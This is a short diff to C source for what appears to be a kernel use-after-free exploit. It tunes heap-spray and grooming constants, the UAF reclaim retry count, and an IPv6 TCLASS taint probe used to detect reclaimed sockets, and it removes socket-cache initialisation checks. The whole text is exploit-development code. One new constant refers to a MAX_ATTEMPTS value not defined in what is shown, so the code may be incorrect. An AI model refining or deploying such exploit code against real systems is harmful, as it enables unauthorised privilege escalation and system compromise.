@@ -22,7 +22,6 @@
 #define TCLASS_TAINT 0x42
 #define SPRAY_SIZE 64
 #define SPRAY_TOTAL 256
-#define CLOSEUP_ARRAY_SIZE 512
 #define NEW_SOCKET() socket(AF_INET6, SOCK_DGRAM, 0)
 
 #define NANOSLEEP_100US "\0\0\0\0\0\0\0\0\xa0\x86\x01\0\0\0\0\0"
@@ -34,6 +33,7 @@
 #define HEAP_GROOM_COUNT 100
 #define MAX_TRIES 500
 #define UAF_RECLAIM_TRIES (MAX_TRIES * 2)
+#define CLOSEUP_ARRAY_SIZE (SPRAY_TOTAL + (2 * MAX_ATTEMPTS) + 2 + 1) // = 256 + 10 + 2 + 1 = 269
 
 #define DEFRAG_PASSES 3
 #define DEFRAG_SMALL_SOCKETS 16
@@ -84,10 +84,6 @@ void safe_close_socket(int sock) {
 
 // Use socket cache if available
 int fast_new_socket(void) {
-    if (!socket_cache_initialized) {
-        init_socket_cache();
-    }
-
     if (socket_cache_count > 0) {
         int sock = socket_cache[--socket_cache_count];
         socket_cache[socket_cache_count] = -1;
@@ -100,7 +96,6 @@ int fast_new_socket(void) {
 // Store socket cache
 void cache_socket(int sock) {
     if (sock < 0) return;
-    if (!socket_cache_initialized) init_socket_cache();
 
     if (socket_cache_count < SOCKET_CACHE_SIZE) {
         socket_cache[socket_cache_count++] = sock;
@@ -115,7 +110,7 @@ int name(int s) { \
     socklen_t l = sizeof(v); \
     if (getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l)) \
         *(volatile int*)0; \
-        return v; \
+    return v; \
 }
 
 GET_TCLASS(get_tclass)
